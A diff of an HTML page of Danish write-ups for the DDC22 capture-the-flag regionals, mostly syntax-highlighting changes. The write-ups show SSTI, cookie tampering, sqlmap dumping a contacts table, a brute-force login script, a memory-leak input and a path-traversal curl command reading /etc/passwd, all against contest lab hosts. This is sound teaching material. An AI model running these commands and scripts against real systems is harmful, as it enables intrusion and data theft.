@@ -1,11 +1,11 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<!-- 2022-11-01 Tue 12:42 -->
+<!-- 2022-12-09 Fri 13:37 -->
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>DDC22 Regionals | Write-up collection (Danish)</title>
-<meta name="author" content="Main user for my machines" />
+<meta name="author" content="C3lphie" />
 <meta name="generator" content="Org Mode" />
 <link rel="stylesheet" type="text/css" href="static/style.css" />
 <script>
@@ -76,7 +76,7 @@ Jeg klarede 6 opgaver i alt i den regionale del af konkurrencen, og fik med 800 
 Antal point: 50<br>
 Beskrivelse:<br>
 </p>
-<pre class="example" id="org245f45a">
+<pre class="example" id="org5323d00">
 De hemmelige egern er på farten igen med deres nødder og telekinetiske evner.
 Se om du kan finde deres hemmelige config key til deres hjemmeside ssti.hkn
 </pre>
@@ -135,7 +135,7 @@ Og der har vi jo flaget: <code>DDC{SSTI_1n_fl45k_15_wh3r3_7h3_squ1rr3l_h1d3_7h3_
 Antal point: 50<br>
 Beskrivelse:<br>
 </p>
-<pre class="example" id="orgfe7bf6c">
+<pre class="example" id="org40eea44">
 Jeg har opdateret min hjemmeside til styring af kontakter og har nu fået lukket sikkerhedshullet i vCard-systemet. Jeg er dog stadig lidt bekymret, da jeg gemmer en del personfølsom data i mine systemer, og jeg vil nødig have, at nogen får adgang til andres konti og kontakter. Vil du tjekke den nye udgave for mig? Så giver jeg en cookie!
 
 http://contacts-vault.hkn
@@ -156,7 +156,7 @@ Man kan se de cookies ens browser gemmer under debug tools og storage:<br>
 <img src="assets/2022-04-14_14-09-02_screenshot.png" alt="2022-04-14_14-09-02_screenshot.png"><br>
 I cookien er der en JSON string hvor vi har et <code>_user_id</code> sat til værdien 6:<br>
 </p>
-<pre class="example" id="org1385954">
+<pre class="example" id="org92c1f16">
 "{\"_user_id\": \"6\"\054 \"_fresh\": true\054 \"_id\": \"a33260853250b0d0d323433e67e53e64f90ec67a81533f05ee8e64e816f281059ffad6ba117cef8c667a742331a27c09491075ab8a91c1aefb057e21c1cc6824\"}"
 </pre>
 
@@ -178,7 +178,7 @@ DDC{f1x_th4t_c00k1e_vuln_0r_cl0se_th3_b4k3ry}
 Antal point: 200<br>
 Beskrivelse:<br>
 </p>
-<pre class="example" id="orgfb47bf5">
+<pre class="example" id="org6ff7263">
 Nu burde alle sikkerhedshullerne på min hjemmeside være lukket, så ingen længere kan se andres kontakter! Er lidt mere tryg nu, jeg har nemlig en super hemmelig kontakt, som ingen må få at se! Den er dog også ekstra beskyttet og kan kun ses direkte fra min admin profil.
 
 Jeg har også forbedret søgefunktionen lidt, så man nemmere kan finde sine kontakter. Vil du hjælpe mig med at tjekke nyeste udgave? Det er bare en formalitet, har næsten ikke ændret noget, men det skal jo gøres. Tak!
@@ -191,7 +191,7 @@ Denne opgave er en fortsættelse på forrige opgave.<br>
 Efter at have patchet forrige fejl, skal vi prøve at finde en ny.<br>
 Brugerfladen er den samme som før, men kigger vi på vores cookies er den ikke længere så let læselig:<br>
 </p>
-<pre class="example" id="orge6523e1">
+<pre class="example" id="orgf00e421">
 .eJwljjsOAyEMBe9CncIfDGYvszJgK2nZbBXl7kFKM3oavWI-6Yzl1zMd73X7I52vmY5kzFRAhUmgw4TJxJnZS3XZzNHAR6mmKMwB4q7bumIJUgRpETZLN8Q6PHSU_a2ZmNGoDmi5IVSxrtZwoHl0kOq09xhFKacdcl--_jVI6fsDXpwuOQ.YlgREw.OJxo-Kot0pARQLuCN3HPX-aIqNU
 </pre>
 <p>
@@ -247,7 +247,7 @@ sqlmap -u http://contact-vault.hkn/search?s=asd
 <p>
 Istedet kan vi bruge en fil der indeholder en HTTP request.<br>
 </p>
-<pre class="example" id="orge0cbbb3">
+<pre class="example" id="org84cd105">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals ]
 └─&gt; $ cat contact-vault.txt
 GET /search?s=asdf HTTP/1.1
@@ -270,7 +270,7 @@ Denne er samlet op og gemt gennem burp suite.<br>
 Og så kan vi give den til sqlmap med flaget <code>-r</code> for request fil&#x2026;.<br>
 Men af en eller anden årsag virkede dette ikke for mig, grundet en bug i sqlmap skulle give den fulde path til filen, og det tog mig lidt for lang tid at indse til konkurrencen&#x2026; dette kunne dog fikses ved hjælp miljø variable <code>$PWD</code><br>
 </p>
-<pre class="example" id="orgafbd3a0">
+<pre class="example" id="orgeff20e2">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals ]
 └─&gt; $ sqlmap -r $PWD/contact-vault.txt
         ___
@@ -326,7 +326,7 @@ Dette virkede heller ikke&#x2026; på trods af at vi havde bekræftet det selv&#
 Grunden til dette er at sqlmap, kan hvis det ikke bliver brugt forsigtigt potentielt lave meget skade.<br>
 Vi kan sige at vi er ligeglade, og sætte vores level højere og lave et større mængde tests.<br>
 </p>
-<pre class="example" id="orgec5a0c5">
+<pre class="example" id="orgf98a740">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals ]
 └─&gt; $ sqlmap -r $PWD/contact-vault.txt --level=3 --threads=6
         ___
@@ -423,7 +423,7 @@ sqlmap -r $PWD/contact-vault.txt --dump &lt;tabel navn&gt;
 <p>
 Jeg valgte at gå efter kontakterne, og efter et par minutter fik jeg trukket følgende ud fra databasen:<br>
 </p>
-<pre class="example" id="orgd2b9333">
+<pre class="example" id="org7082f7a">
 +----+---------+----+----+-----+-----+----------------------------------------------------+------------------------+---------+---------+-----------+------------+------------+
 | id | user_id | 20 | 80 | 100 | 200 | email                                              | phone                  | FOREIGN | PRIMARY | is_secret | last_name  | first_name |
 +----+---------+----+----+-----+-----+----------------------------------------------------+------------------------+---------+---------+-----------+------------+------------+
@@ -459,7 +459,7 @@ DDC{b3tt3r_f1x_th4t_SQLi_vuln_GDPR_4ud1t_1s_cl0s3}
 Antal point: 100<br>
 Beskrivelse:<br>
 </p>
-<pre class="example" id="org02f02d2">
+<pre class="example" id="org60daecb">
 Du skal nok bare sende en masse requests altså bare-request-amok.hkn:5000
 </pre>
 
@@ -468,7 +468,7 @@ Til denne opgave skulle vi bruteforce et login til en hjemmeside, for derefter a
 Besøger vi siden bliver vi mødt med følgende login:<br>
 </p>
 
-<figure id="org30edaed">
+<figure id="org4ace7ae">
 <img src="assets/2022-04-14_09-57-27_screenshot.png" alt="2022-04-14_09-57-27_screenshot.png"><br>
 
 <figcaption><span class="figure-number">Figure 1: </span>Login side for opgaven.</figcaption>
@@ -479,7 +479,7 @@ De kære challenge authors, har været så venlige at give os kildekoden til web
 Grunden til det er fedt er at vi så har mulighed for at teste lokalt indtil det virker uden at belaste serveren!<br>
 Vi fik en filen <code>source.zip</code> udleveret med følgende indhold:<br>
 </p>
-<pre class="example" id="org13d527d">
+<pre class="example" id="org4dfc482">
 total 1588
 -rw-r--r-- 1 c3lphie c3lphie    2985 Apr  9 17:56 app.py
 -rw-r--r-- 1 c3lphie c3lphie     961 Dec 13 11:29 directory.txt
@@ -511,14 +511,14 @@ Og index funktionen, returnere altså enten <code>index.html</code> hvor vi kan 
 Der bliver også lavet en CSRF token, til at beskytte mod CSRF angreb.<br>
 </p>
 <div class="org-src-container">
-<pre class="src src-python">@app.route("/")
-def index():
-    print(AdminPassword)
-    print(hiddendir)
-    if not session.get('logged_in'):
-	return render_template('index.html',csrf_token=newCSRF("index"))
-    else:
-	return render_template("admin.html",csrf_token=newCSRF("admin"))
+<pre class="src src-python"><span class="org-py-decorators">@app.route</span>(<span class="org-string">"/"</span>)
+<span class="org-py-def-class">def</span> <span class="org-py-def">index</span>():
+    <span class="org-keyword">print</span>(AdminPassword)
+    <span class="org-keyword">print</span>(hiddendir)
+    <span class="org-keyword">if</span> <span class="org-keyword">not</span> session.get(<span class="org-string">'logged_in'</span>):
+	<span class="org-keyword">return</span> render_template(<span class="org-string">'index.html'</span>,csrf_token=newCSRF(<span class="org-string">"index"</span>))
+    <span class="org-keyword">else</span>:
+	<span class="org-keyword">return</span> render_template(<span class="org-string">"admin.html"</span>,csrf_token=newCSRF(<span class="org-string">"admin"</span>))
 </pre>
 </div>
 
@@ -527,18 +527,18 @@ Nedenfor ses login funktionaliteten, hvor vi kan se at der SKAL bruges en CSRF t
 Heldigvis har vi et hardcoded brugernavn <code>admin</code>, hvilket skære en del af tid af vores angreb ikke at skulle fine brugernavn heller hehe.<br>
 </p>
 <div class="org-src-container">
-<pre class="src src-python">@app.route("/login", methods=(['POST']))
-def login():
-    if request.method == 'POST':
-	username = request.form.get("username")
-	password = request.form.get("password")
-	csrf_token = request.form.get("csrf_token")
-	if username == "admin" and password == AdminPassword and useCSRF(csrf_token,"index"):
-	    print("dope")
+<pre class="src src-python"><span class="org-py-decorators">@app.route</span>(<span class="org-string">"/login"</span>, methods=([<span class="org-string">'POST'</span>]))
+<span class="org-py-def-class">def</span> <span class="org-py-def">login</span>():
+    <span class="org-keyword">if</span> <span class="org-py-variable-name">request.method</span> == <span class="org-string">'POST'</span>:
+	<span class="org-py-variable-name">username</span> = request.form.get(<span class="org-string">"username"</span>)
+	<span class="org-py-variable-name">password</span> = request.form.get(<span class="org-string">"password"</span>)
+	<span class="org-py-variable-name">csrf_token</span> = request.form.get(<span class="org-string">"csrf_token"</span>)
+	<span class="org-keyword">if</span> <span class="org-py-variable-name">username</span> == <span class="org-string">"admin"</span> <span class="org-keyword">and</span> <span class="org-py-variable-name">password</span> == AdminPassword <span class="org-keyword">and</span> useCSRF(csrf_token,<span class="org-string">"index"</span>):
+	    <span class="org-keyword">print</span>(<span class="org-string">"dope"</span>)
 	    session.clear()
-	    session['logged_in'] = True
-	    session['username']="admin"
-    return redirect(url_for('index'))
+	    session[<span class="org-string">'logged_in'</span>] = <span class="org-py-pseudo-keyword">True</span>
+	    session[<span class="org-string">'username'</span>]=<span class="org-string">"admin"</span>
+    <span class="org-keyword">return</span> redirect(url_for(<span class="org-string">'index'</span>))
 </pre>
 </div>
 <p>
@@ -547,24 +547,24 @@ Der skal også bruges en CSRF token her for at kunne få flaget i sidste ende.<b
 En lille detalje der er vigtig at bide mærke i er funktions kaldet inden vi returnere, <code>session.clear()</code> som gør at vi skal logge ind igen uanset hvad der sker med vores request.<br>
 </p>
 <div class="org-src-container">
-<pre class="src src-python">@app.route("/"+hiddendir, methods=('GET','POST'))
-def wuhuuuuuuuuu():
-    print("hidden dir")
-    if request.method == 'POST' and session.get('logged_in'):
-	print("posted hidden dir")
+<pre class="src src-python"><span class="org-py-decorators">@app.route</span>(<span class="org-string">"/"</span>+hiddendir, methods=(<span class="org-string">'GET'</span>,<span class="org-string">'POST'</span>))
+<span class="org-py-def-class">def</span> <span class="org-py-def">wuhuuuuuuuuu</span>():
+    <span class="org-keyword">print</span>(<span class="org-string">"hidden dir"</span>)
+    <span class="org-keyword">if</span> <span class="org-py-variable-name">request.method</span> == <span class="org-string">'POST'</span> <span class="org-keyword">and</span> session.get(<span class="org-string">'logged_in'</span>):
+	<span class="org-keyword">print</span>(<span class="org-string">"posted hidden dir"</span>)
 
-	csrf_token = request.form.get("csrf_token")
-	print("csrf "+csrf_token)
-	print(CSRFmap)
-	if useCSRF(csrf_token,"admin"):
-	    return """&lt;html&gt;
-				&lt;body&gt;
-				    &lt;h1&gt;%s&lt;/h1&gt;
-				&lt;/body&gt;
-				&lt;/html&gt;
-				""" % flag
+	<span class="org-py-variable-name">csrf_token</span> = request.form.get(<span class="org-string">"csrf_token"</span>)
+	<span class="org-keyword">print</span>(<span class="org-string">"csrf "</span>+csrf_token)
+	<span class="org-keyword">print</span>(CSRFmap)
+	<span class="org-keyword">if</span> useCSRF(csrf_token,<span class="org-string">"admin"</span>):
+	    <span class="org-keyword">return</span> <span class="org-string">"""&lt;html&gt;</span>
+<span class="org-string">				&lt;body&gt;</span>
+<span class="org-string">				    &lt;h1&gt;%s&lt;/h1&gt;</span>
+<span class="org-string">				&lt;/body&gt;</span>
+<span class="org-string">				&lt;/html&gt;</span>
+<span class="org-string">				"""</span> % flag
     session.clear()
-    return redirect(url_for('index'))
+    <span class="org-keyword">return</span> redirect(url_for(<span class="org-string">'index'</span>))
 </pre>
 </div>
 
@@ -573,10 +573,10 @@ En lille hale ved hele den her applikation er at vores session bliver cleared hv
 Vi skal altså logge ind igen, hvis vi rammer et ikke eksisterende endpoint.<br>
 </p>
 <div class="org-src-container">
-<pre class="src src-python">@app.errorhandler(404)
-def page_not_found(error):
+<pre class="src src-python"><span class="org-py-decorators">@app.errorhandler</span>(<span class="org-py-number">404</span>)
+<span class="org-py-def-class">def</span> <span class="org-py-def">page_not_found</span>(error):
     session.clear()
-    return redirect(url_for('index'))
+    <span class="org-keyword">return</span> redirect(url_for(<span class="org-string">'index'</span>))
 </pre>
 </div>
 
@@ -587,7 +587,7 @@ Og <code>requests</code> biblioteket til at håndtere HTTP requests der skulle s
 Jeg vil ikke gå i detaljer omkring mit script da det er relativ simpelt at forstå, men vil anbefale at læse det igennem hvis du ikke har erfaring.<br>
 Kort beskrevet er angrebet design sådan:<br>
 </p>
-<pre class="example" id="org4003f6e">
+<pre class="example" id="org620e7d3">
 læs passwords fra fil
 læs hiddendirs fra fil
 
@@ -613,7 +613,7 @@ for hver folder i hiddendirs
 <p>
 Køre vi scriptet:<br>
 </p>
-<pre class="example" id="org3c840d2">
+<pre class="example" id="org8d3fb1e">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals/request_amok ]
 └─&gt; $ time python3 solve.py
 /home/c3lphie/hacking/ctf/ddc22/regionals/request_amok/solve.py:18: GuessedAtParserWarning: No parser was explicitly specified, so I'm using the best available HTML parser for this system ("html5lib"). This usually isn't a problem, but if you run this code on another system, or in a different virtual environment, it may use a different parser and behave differently.
@@ -635,56 +635,56 @@ Får vi flaget <code>DDC{scr1pt_d1g_ud_4f_d3t_b4re_r3qu3st_am4k}</code> efter om
 </p>
 
 <div class="org-src-container">
-<label class="org-src-name"><span class="listing-number">Listing 1: </span><code>solve.py</code></label><pre class="src src-python">import requests
-from bs4 import BeautifulSoup
+<label class="org-src-name"><span class="listing-number">Listing 1: </span><code>solve.py</code></label><pre class="src src-python"><span class="org-py-import-from">import</span> requests
+<span class="org-py-import-from">from</span> bs4 <span class="org-py-import-from">import</span> BeautifulSoup
 
-session = requests.Session()
+<span class="org-py-variable-name">session</span> = requests.Session()
 
-target = "http://bare-request-amok.hkn:5000"
+<span class="org-py-variable-name">target</span> = <span class="org-string">"http://bare-request-amok.hkn:5000"</span>
 
-passwords = ""
-hiddendirs = ""
+<span class="org-py-variable-name">passwords</span> = <span class="org-string">""</span>
+<span class="org-py-variable-name">hiddendirs</span> = <span class="org-string">""</span>
 
-with open("passwords.txt","r") as f:
-    passwords = f.read().splitlines()
+<span class="org-keyword">with</span> <span class="org-py-builtins">open</span>(<span class="org-string">"passwords.txt"</span>,<span class="org-string">"r"</span>) <span class="org-keyword">as</span> <span class="org-py-variable-name">f</span>:
+    <span class="org-py-variable-name">passwords</span> = f.read().splitlines()
 
-with open("directory.txt","r") as f:
-    hiddendirs = f.read().splitlines()
+<span class="org-keyword">with</span> <span class="org-py-builtins">open</span>(<span class="org-string">"directory.txt"</span>,<span class="org-string">"r"</span>) <span class="org-keyword">as</span> <span class="org-py-variable-name">f</span>:
+    <span class="org-py-variable-name">hiddendirs</span> = f.read().splitlines()
 
-def get_csrf(text):
-    soup = BeautifulSoup(text)
-    inputs = soup.find_all(attrs={"name":"csrf_token"})
-    return inputs[0]["value"]
+<span class="org-py-def-class">def</span> <span class="org-py-def">get_csrf</span>(text):
+    <span class="org-py-variable-name">soup</span> = BeautifulSoup(text)
+    <span class="org-py-variable-name">inputs</span> = soup.find_all(attrs={<span class="org-string">"name"</span>:<span class="org-string">"csrf_token"</span>})
+    <span class="org-keyword">return</span> inputs[<span class="org-py-number">0</span>][<span class="org-string">"value"</span>]
 
 
-def brute_login():
-    res = requests.get(target)
-    csrf = get_csrf(res.text)
-    for x in passwords:
-	res = requests.post(target + "/login", data={"username": "admin", "password": x, "csrf_token":csrf})
-	csrf = get_csrf(res.text)
-	if "secret path" in res.text:
-	    return x, csrf
+<span class="org-py-def-class">def</span> <span class="org-py-def">brute_login</span>():
+    <span class="org-py-variable-name">res</span> = requests.get(target)
+    <span class="org-py-variable-name">csrf</span> = get_csrf(res.text)
+    <span class="org-keyword">for</span> x <span class="org-keyword">in</span> <span class="org-py-variable-name">passwords</span>:
+	<span class="org-py-variable-name">res</span> = requests.post(target + <span class="org-string">"/login"</span>, data={<span class="org-string">"username"</span>: <span class="org-string">"admin"</span>, <span class="org-string">"password"</span>: x, <span class="org-string">"csrf_token"</span>:csrf})
+	<span class="org-py-variable-name">csrf</span> = get_csrf(res.text)
+	<span class="org-keyword">if</span> <span class="org-string">"secret path"</span> <span class="org-keyword">in</span> <span class="org-py-variable-name">res.text</span>:
+	    <span class="org-keyword">return</span> x, csrf
 
-def login_adm(session,admPass, csrf):
-    res = session.get(target)
-    csrf = get_csrf(res.text)
-    res = session.post(target + "/login", data={"username": "admin", "password": admPass, "csrf_token":csrf})
-    return get_csrf(res.text)
+<span class="org-py-def-class">def</span> <span class="org-py-def">login_adm</span>(session,admPass, csrf):
+    <span class="org-py-variable-name">res</span> = session.get(target)
+    <span class="org-py-variable-name">csrf</span> = get_csrf(res.text)
+    <span class="org-py-variable-name">res</span> = session.post(target + <span class="org-string">"/login"</span>, data={<span class="org-string">"username"</span>: <span class="org-string">"admin"</span>, <span class="org-string">"password"</span>: admPass, <span class="org-string">"csrf_token"</span>:csrf})
+    <span class="org-keyword">return</span> get_csrf(res.text)
 
-def brute_dir(admPass, csrf):
-    session = requests.Session()
-    csrf = login_adm(session,admPass, csrf)
-    for x in hiddendirs:
-	csrf = login_adm(session,admPass, csrf)
-	res = session.post(target + "/" + x, data={"csrf_token":csrf})
-	#csrf = get_csrf(res.text)
-	if "DDC" in res.text:
-	    print(res.text)
-	    break
+<span class="org-py-def-class">def</span> <span class="org-py-def">brute_dir</span>(admPass, csrf):
+    <span class="org-py-variable-name">session</span> = requests.Session()
+    <span class="org-py-variable-name">csrf</span> = login_adm(session,admPass, csrf)
+    <span class="org-keyword">for</span> x <span class="org-keyword">in</span> <span class="org-py-variable-name">hiddendirs</span>:
+	<span class="org-py-variable-name">csrf</span> = login_adm(session,admPass, csrf)
+	<span class="org-py-variable-name">res</span> = session.post(target + <span class="org-string">"/"</span> + x, data={<span class="org-string">"csrf_token"</span>:csrf})
+	<span class="org-comment">#csrf = get_csrf(res.text)</span>
+	<span class="org-keyword">if</span> <span class="org-string">"DDC"</span> <span class="org-keyword">in</span> <span class="org-py-variable-name">res.text</span>:
+	    <span class="org-keyword">print</span>(res.text)
+	    <span class="org-keyword">break</span>
 
-adm_pass, csrf = brute_login()
-print("Found admin pass")
+<span class="org-py-variable-name">adm_pass</span>, <span class="org-py-variable-name">csrf</span> = brute_login()
+<span class="org-keyword">print</span>(<span class="org-string">"Found admin pass"</span>)
 brute_dir(adm_pass, csrf)
 </pre>
 </div>
@@ -698,7 +698,7 @@ brute_dir(adm_pass, csrf)
 Antal point: 100<br>
 Beskrivelse:<br>
 </p>
-<pre class="example" id="org022d0ef">
+<pre class="example" id="org08adf0c">
 På urlParse.hkn 9000, kan du netcat til server og finde et simpelt program, der tager en url som input, som indeholder et brugernavn og en adgangskode, og derefter spytter dem tilbage efter dig. URL’en er af denne form:
 
  http://bruger:password@somehost.com
@@ -711,41 +711,41 @@ I denne opgave fik vi udleveret en binær fil og kildekoden for en urlparser.<br
 Nedenfor ses kildekoden for programmet:<br>
 </p>
 <div class="org-src-container">
-<pre class="src src-c">#include &lt;stdio.h&gt;
-#include &lt;string.h&gt;
-#include &lt;sys/types.h&gt;
-#include &lt;unistd.h&gt;
-int main() {
-    char *field;
-    char *col, *at; 
-    char flag[64];
-    char input[64];
-    char buf[64];
+<pre class="src src-c"><span class="org-preprocessor">#include</span> <span class="org-string">&lt;stdio.h&gt;</span>
+<span class="org-preprocessor">#include</span> <span class="org-string">&lt;string.h&gt;</span>
+<span class="org-preprocessor">#include</span> <span class="org-string">&lt;sys/types.h&gt;</span>
+<span class="org-preprocessor">#include</span> <span class="org-string">&lt;unistd.h&gt;</span>
+<span class="org-type">int</span> <span class="org-function-name">main</span>() {
+    <span class="org-type">char</span> *<span class="org-variable-name">field</span>;
+    <span class="org-type">char</span> *<span class="org-variable-name">col</span>, *<span class="org-variable-name">at</span>; 
+    <span class="org-type">char</span> <span class="org-variable-name">flag</span>[64];
+    <span class="org-type">char</span> <span class="org-variable-name">input</span>[64];
+    <span class="org-type">char</span> <span class="org-variable-name">buf</span>[64];
 
-    // read flag
+    <span class="org-comment-delimiter">// </span><span class="org-comment">read flag</span>
 
-    FILE *f = fopen("flag.txt", "r");
-    if(f == NULL){
-	printf("flag not found: please run this on the server\n");
+    <span class="org-type">FILE</span> *<span class="org-variable-name">f</span> = fopen(<span class="org-string">"flag.txt"</span>, <span class="org-string">"r"</span>);
+    <span class="org-keyword">if</span>(f == <span class="org-constant">NULL</span>){
+	printf(<span class="org-string">"flag not found: please run this on the server\n"</span>);
 	}
     fgets(flag, 63, f);
 
 
-    // Read user input
-    scanf("%64s", input);
-    // Check url
-    if (strncmp("http://", input, 7) != 0) {
-	printf("Not a URL\n");
-	return -1;
+    <span class="org-comment-delimiter">// </span><span class="org-comment">Read user input</span>
+    scanf(<span class="org-string">"%64s"</span>, input);
+    <span class="org-comment-delimiter">// </span><span class="org-comment">Check url</span>
+    <span class="org-keyword">if</span> (strncmp(<span class="org-string">"http://"</span>, input, 7) != 0) {
+	printf(<span class="org-string">"Not a URL\n"</span>);
+	<span class="org-keyword">return</span> -1;
     }
-    // Skip http
-    field = strchr(input, '/')+2;
-    // ptr to colon
-    col = strchr(field, ':');
-    // ptr to at
-    at = strchr(field, '@');
-    unsigned char pw_size = at-col;
-    unsigned char user_size = col-field;
+    <span class="org-comment-delimiter">// </span><span class="org-comment">Skip http</span>
+    field = strchr(input, <span class="org-string">'/'</span>)+2;
+    <span class="org-comment-delimiter">// </span><span class="org-comment">ptr to colon</span>
+    col = strchr(field, <span class="org-string">':'</span>);
+    <span class="org-comment-delimiter">// </span><span class="org-comment">ptr to at</span>
+    at = strchr(field, <span class="org-string">'@'</span>);
+    <span class="org-type">unsigned</span> <span class="org-type">char</span> <span class="org-variable-name">pw_size</span> = at-col;
+    <span class="org-type">unsigned</span> <span class="org-type">char</span> <span class="org-variable-name">user_size</span> = col-field;
 
     memcpy(buf, flag, strlen(flag));
 
@@ -763,7 +763,7 @@ Herefter finder den længderne for brugernavnet og passwordet i urllen.<br>
 Hvorefter den skriver urllen til stdout, problemet her er dog at vi styre størrelsen af det den skriver ud.<br>
 Dette betyder at vi kan læse dele af hukommelsen ved at læse uden for variablen <code>field</code>'s hukommelses område.<br>
 </p>
-<pre class="example" id="org127f949">
+<pre class="example" id="org0fd3b3d">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals/urlparse/sourceAndBinary ]
 └─&gt; $ ./urlParse
 http://AAAAAAAAAAAAAAAAAA:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@asdfasfd.asdfaf
@@ -773,7 +773,7 @@ ygd{WO%
 <p>
 Prøver vi dette på remote:<br>
 </p>
-<pre class="example" id="orgcb7e4b5">
+<pre class="example" id="org2dad2e7">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals/urlparse/sourceAndBinary ]
 └─&gt; $ nc urlparse.hkn 9000
 http://A:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -799,7 +799,7 @@ DDC{dsABxVLqOC}
 Antal point: 300<br>
 Beskrivelse:<br>
 </p>
-<pre class="example" id="orgb58c91d">
+<pre class="example" id="org4eb30bc">
 hallo kan du lige tjekke mrbeefs bestilling ud på http://mrbeefs-bestilling.hkn ???
 </pre>
 
@@ -807,7 +807,7 @@ hallo kan du lige tjekke mrbeefs bestilling ud på http://mrbeefs-bestilling.hkn
 Da denne opgave er i kategorien <b>boot2root</b>, så brugte jeg samme tilgang som jeg bruger på maskiner fra hackhebox.<br>
 Så jeg startede med at køre <code>nmap</code>:<br>
 </p>
-<pre class="example" id="orgf0455dc">
+<pre class="example" id="orgb0b0460">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals/mr_beefs_bestilling ]
 └─&gt; $ cat nmap/all_ports.nmap
 # Nmap 7.92 scan initiated Sat Apr  9 11:10:58 2022 as: nmap -sS -n -Pn -p- -oA nmap/all_ports mrbeefs-bestilling.hkn
@@ -843,7 +843,7 @@ Her fra spekulerede jeg på om der måske var en Local File Inclusion fejl i app
 Så istedet for at spørge om <code>mrbeef.png</code>, så prøvede jeg <code>../../../../../../etc/passwd</code> hvorefter jeg decodede indholdet.<br>
 For at gøre det så nemt som muligt, lavede jeg denne oneliner:<br>
 </p>
-<pre class="example" id="orgc52d9d0">
+<pre class="example" id="org9341683">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals/mr_beefs_bestilling ]
 └─&gt; $ curl 'http://mrbeefs-bestilling.hkn/file.php?file=../../../../../../etc/passwd' -S | cut -d "," -f 2 | cut -d "&gt;" -f 1 | base64 -d
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
@@ -874,7 +874,7 @@ mrbeef:x:1000:1000::/home/mrbeef:/bin/sh
 Og der har vi indholdet af <code>passwd</code> filen.<br>
 Dette kunne vi bruge til at skaffe kildekoden for hjemmesiden:<br>
 </p>
-<pre class="example" id="org70ef626">
+<pre class="example" id="org7d33f24">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals/mr_beefs_bestilling ]
 └─&gt; $ curl 'http://mrbeefs-bestilling.hkn/file.php?file=../index.php' -S | cut -d "," -f 2 | cut -d "&gt;" -f 1 | base64 -d
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
@@ -897,7 +897,7 @@ Great Success!!<br>
 <p>
 Jeg downloadede herefter de andre filer:<br>
 </p>
-<pre class="example" id="orgce6e24a">
+<pre class="example" id="orga2eb067">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals/mr_beefs_bestilling ]
 └─&gt; $ ls -l php_files
 total 12
@@ -911,24 +911,24 @@ Filen der vagte størst opmærksomhed var <code>upload.php</code>, da den potent
 Der var en klasse kaldet <code>fileuploadedbackup</code>:<br>
 </p>
 <div class="org-src-container">
-<pre class="src src-php">Class fileuploadedbackup{
-    public $filename;
-    public $filecontent;
-    public $fileextension;
+<pre class="src src-php"><span class="org-type">Class</span> <span class="org-variable-name">fileuploadedbackup</span>{
+    <span class="org-php-keyword">public</span> <span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">filename</span>;
+    <span class="org-php-keyword">public</span> <span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">filecontent</span>;
+    <span class="org-php-keyword">public</span> <span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">fileextension</span>;
 
-    function __wakeup(){
-	if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;filecontent)){
-	    $myfile = fopen("./images/".$this-&gt;filename, "w") or die("Unable to open file!");
-	    fwrite($myfile, base64_decode($this-&gt;filecontent));
-	    fclose($myfile);
-	    echo("image restored from backup, good job devloper :'-)");
+    <span class="org-php-keyword">function</span> <span class="org-php-function-name">__wakeup</span>(){
+	<span class="org-php-keyword">if</span>(<span class="org-php-keyword">isset</span>(<span class="org-php-Xthis-sigil">$</span><span class="org-php-Xthis">this</span><span class="org-php-object-op">-&gt;</span><span class="org-php-property-name">filename</span>) <span class="org-php-logical-op">&amp;&amp;</span> <span class="org-php-keyword">isset</span>(<span class="org-php-Xthis-sigil">$</span><span class="org-php-Xthis">this</span><span class="org-php-object-op">-&gt;</span><span class="org-php-property-name">filecontent</span>)){
+	    <span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">myfile</span> <span class="org-php-assignment-op">=</span> <span class="org-php-function-call">fopen</span>(<span class="org-php-string">"./images/"</span>.<span class="org-php-Xthis-sigil">$</span><span class="org-php-Xthis">this</span><span class="org-php-object-op">-&gt;</span><span class="org-php-property-name">filename</span>, <span class="org-php-string">"w"</span>) <span class="org-php-keyword">or</span> <span class="org-php-keyword">die</span>(<span class="org-php-string">"Unable to open file!"</span>);
+	    <span class="org-php-function-call">fwrite</span>(<span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">myfile</span>, <span class="org-php-function-call">base64_decode</span>(<span class="org-php-Xthis-sigil">$</span><span class="org-php-Xthis">this</span><span class="org-php-object-op">-&gt;</span><span class="org-php-property-name">filecontent</span>));
+	    <span class="org-php-function-call">fclose</span>(<span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">myfile</span>);
+	    <span class="org-php-keyword">echo</span>(<span class="org-php-string">"image restored from backup, good job devloper :'-)"</span>);
 	}
     }
 
-    function backup(){
-	$myfile = fopen("./backupzz/".$this-&gt;filename.".bak", "w") or die("Unable to open file!");
-	fwrite($myfile, serialize($this));
-	fclose($myfile);
+    <span class="org-php-keyword">function</span> <span class="org-php-function-name">backup</span>(){
